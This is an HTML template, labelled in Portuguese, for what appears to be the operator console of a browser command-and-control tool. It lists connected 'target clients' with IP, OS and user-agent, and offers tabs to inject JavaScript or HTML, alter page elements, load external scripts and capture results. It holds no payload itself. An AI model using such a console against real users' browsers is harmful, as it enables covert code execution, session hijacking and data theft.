<!-- Command Control Panel -->
<div class="card mb-4">
    <div class="card-header">
        Painel de Controle
    </div>
    <div class="card-body">
        <div class="form-group mb-4">
            <label for="target-client" class="form-label">Cliente alvo:</label>
            <select id="target-client" class="form-select">
                <option value="default">Todos os clientes</option>
                <!-- Os clientes serão carregados dinamicamente -->
            </select>
        </div>

        <!-- Result Capture Toggle -->
        <div class="form-group mb-4">
            <div class="d-flex align-items-center justify-content-between">
                <div class="capture-setting-info">
                    <label class="form-label mb-1">Captura de Resultados:</label>
                    <small class="text-muted d-block">Capturar e exibir resultados dos comandos executados</small>
                </div>
                <div class="capture-toggle-container" id="capture-toggle-container"
                     hx-get="/admin/capture_status" 
                     hx-trigger="load" 
                     hx-swap="outerHTML">
                    <!-- Toggle will be loaded here -->
                    <div class="capture-loading">
                        <i class="fas fa-sync fa-spin text-accent"></i>
                        <span class="ms-2">Carregando...</span>
                    </div>
                </div>
            </div>
        </div>

        <!-- Seção de Informações do Cliente -->
        <div id="client-info-section" class="mb-4 d-none">
            <div class="card border-accent card-green">
                <div class="card-header d-flex align-items-center justify-content-between">
                    <div>
                        <i class="fas fa-info-circle me-2 text-accent"></i>
                        <span>Informações do Cliente Selecionado</span>
                    </div>
                    <div class="client-status-badge" id="client-status-badge">
                        <span class="badge bg-secondary">Status Desconhecido</span>
                    </div>
                </div>
                <div class="card-body">
                    <div class="client-info-header mb-3">
                        <div class="client-avatar">
                            <i class="fas fa-user-circle"></i>
                            <span class="client-indicator" id="client-indicator"></span>
                        </div>
                        <div class="client-primary-info">
                            <h5 id="info-client-id-title">Cliente</h5>
                            <div class="client-tech-tags" id="client-tech-tags">
                                <!-- Badges serão inseridas dinamicamente -->
                            </div>
                        </div>
                    </div>
                    
                    <div class="row info-grid">
                        <div class="col-md-6">
                            <div class="info-item">
                                <div class="info-icon"><i class="fas fa-fingerprint"></i></div>
                                <div class="info-content">
                                    <span class="info-label">ID</span>
                                    <span class="info-value"><code id="info-client-id">-</code></span>
                                </div>
                            </div>
                            <div class="info-item">
                                <div class="info-icon"><i class="fas fa-globe"></i></div>
                                <div class="info-content">
                                    <span class="info-label">IP</span>
                                    <span class="info-value"><code id="info-client-ip">-</code></span>
                                </div>
                            </div>
                            <div class="info-item">
                                <div class="info-icon"><i class="fas fa-window-maximize"></i></div>
                                <div class="info-content">
                                    <span class="info-label">Browser</span>
                                    <span class="info-value" id="info-client-browser">-</span>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="info-item">
                                <div class="info-icon"><i class="fas fa-clock"></i></div>
                                <div class="info-content">
                                    <span class="info-label">Última Atividade</span>
                                    <span class="info-value" id="info-client-last-activity">-</span>
                                </div>
                            </div>
                            <div class="info-item">
                                <div class="info-icon"><i class="fas fa-network-wired"></i></div>
                                <div class="info-content">
                                    <span class="info-label">Conexão</span>
                                    <span class="info-value" id="info-client-connection">-</span>
                                </div>
                            </div>
                            <div class="info-item">
                                <div class="info-icon"><i class="fas fa-desktop"></i></div>
                                <div class="info-content">
                                    <span class="info-label">Sistema</span>
                                    <span class="info-value" id="info-client-os">-</span>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="mt-3">
                        <button class="btn btn-sm btn-outline-accent" id="show-user-agent" onclick="toggleUserAgent(); return false;">
                            <i class="fas fa-info-circle"></i> Ver User-Agent completo
                        </button>
                    </div>
                    
                    <div id="user-agent-details" class="mt-3 d-none">
                        <div class="alert alert-secondary user-agent-container">
                            <small id="info-client-agent" class="user-agent-full">-</small>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Command Tabs -->
        <ul class="nav nav-tabs" id="commandTabs" role="tablist">
            <li class="nav-item" role="presentation">
                <button class="nav-link active" id="js-tab" data-bs-toggle="tab" 
                    data-bs-target="#js-panel" type="button" role="tab" aria-controls="js-panel" 
                    aria-selected="true">JavaScript</button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="html-tab" data-bs-toggle="tab" 
                    data-bs-target="#html-panel" type="button" role="tab" aria-controls="html-panel" 
                    aria-selected="false">HTML</button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="manipulate-tab" data-bs-toggle="tab" 
                    data-bs-target="#manipulate-panel" type="button" role="tab" 
                    aria-controls="manipulate-panel" aria-selected="false">Manipular Elemento</button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="visibility-tab" data-bs-toggle="tab" 
                    data-bs-target="#visibility-panel" type="button" role="tab" 
                    aria-controls="visibility-panel" aria-selected="false">Visibilidade</button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="head-tab" data-bs-toggle="tab" 
                    data-bs-target="#head-panel" type="button" role="tab" 
                    aria-controls="head-panel" aria-selected="false">Head</button>
            </li>
        </ul>

        <!-- Tab Content -->
        <div class="tab-content" id="commandTabContent">
            <!-- JavaScript Tab -->
            <div class="tab-pane fade show active" id="js-panel" role="tabpanel" aria-labelledby="js-tab">
                <div class="form-group">
                    <label for="js-command" class="form-label">Inject JavaScript:</label>
                    <textarea id="js-command" class="form-control code-editor" placeholder="Digite o código JavaScript aqui..."></textarea>
                    <div class="d-flex justify-content-end mt-3">
                        <button onclick="sendCommand('js')" class="btn btn-accent">
                            <i class="fas fa-play"></i> Executar JS
                        </button>
                    </div>
                </div>
            </div>

            <!-- HTML Tab -->
            <div class="tab-pane fade" id="html-panel" role="tabpanel" aria-labelledby="html-tab">
                <div class="form-group">
                    <label for="html-content" class="form-label">Inject HTML:</label>
                    <textarea id="html-content" class="form-control code-editor" placeholder="Digite o HTML a ser injetado..."></textarea>
                    <div class="d-flex justify-content-end mt-3">
                        <button onclick="sendCommand('html')" class="btn btn-accent">
                            <i class="fas fa-code"></i> Inject HTML
                        </button>
                    </div>
                </div>
            </div>

            <!-- Manipulate Element Tab -->
            <div class="tab-pane fade" id="manipulate-panel" role="tabpanel" aria-labelledby="manipulate-tab">
                <div class="row">
                    <div class="col-md-6 mb-3">
                        <label for="target-element" class="form-label">ID do Elemento:</label>
                        <input type="text" id="target-element" class="form-control" placeholder="ID do Elemento">
                    </div>
                    <div class="col-md-6 mb-3">
                        <label for="action-type" class="form-label">Tipo de Ação:</label>
                        <select id="action-type" class="form-select">
                            <option value="ADD">Adicionar</option>
                            <option value="REPLACE">Substituir</option>
                            <option value="INSERT_AFTER">Inserir Abaixo</option>
                            <option value="INSERT_BEFORE">Inserir Acima</option>
                        </select>
                    </div>
                </div>
                <div class="form-group mb-3">
                    <label for="manipulation-content" class="form-label">Conteúdo:</label>
                    <textarea id="manipulation-content" class="form-control code-editor" placeholder="Conteúdo a ser manipulado..."></textarea>
                </div>
                <div class="d-flex justify-content-end">
                    <button onclick="sendCommand('manipulate')" class="btn btn-accent">
                        <i class="fas fa-edit"></i> Aplicar Manipulação
                    </button>
                </div>
            </div>

            <!-- Visibility Tab -->
            <div class="tab-pane fade" id="visibility-panel" role="tabpanel" aria-labelledby="visibility-tab">
                <div class="form-group mb-3">
                    <label for="visibility-element" class="form-label">ID do Elemento:</label>
                    <input type="text" id="visibility-element" class="form-control" placeholder="ID do Elemento">
                </div>
                <div class="form-check mb-3">
                    <input type="radio" name="visibility" id="show" value="show" class="form-check-input" checked>
                    <label class="form-check-label" for="show">Mostrar</label>
                </div>
                <div class="form-check mb-3">
                    <input type="radio" name="visibility" id="hide" value="hide" class="form-check-input">
                    <label class="form-check-label" for="hide">Ocultar</label>
                </div>
                <div class="d-flex justify-content-end">
                    <button onclick="sendCommand('visibility')" class="btn btn-accent">
                        <i class="fas fa-eye-slash"></i> Aplicar Visibilidade
                    </button>
                </div>
            </div>

            <!-- Head Tab -->
            <div class="tab-pane fade" id="head-panel" role="tabpanel" aria-labelledby="head-tab">
                <div class="form-group mb-3">
                    <label for="head-action" class="form-label">Tipo de Ação:</label>
                    <select id="head-action" class="form-select">
                        <option value="CSS_URL">Adicionar CSS externo (URL)</option>
                        <option value="CSS_INLINE">Adicionar CSS inline</option>
                        <option value="JS_URL">Adicionar Script externo (URL)</option>
                        <option value="JS_INLINE">Adicionar Script inline</option>
                        <option value="META">Adicionar Meta tag</option>
                    </select>
                </div>
                <div class="form-group mb-3">
                    <label for="head-content" class="form-label">Conteúdo:</label>
                    <textarea id="head-content" class="form-control code-editor" placeholder="URL ou conteúdo inline..."></textarea>
                </div>
                <div class="d-flex justify-content-end">
                    <button onclick="sendCommand('head')" class="btn btn-accent">
                        <i class="fas fa-heading"></i> Adicionar ao Head
                    </button>
                </div>
            </div>
        </div>

        <!-- Command result -->
        <div id="command-result-panel" class="mt-4" hidden>
            <h4><i class="fas fa-eye me-2"></i>Result</h4>
            <div id="command-result-content" class="command-result-container"></div>
        </div>

        
        <!-- Status -->
        <div id="status" class="mt-4">Pronto para enviar comandos</div>
    </div>
</div>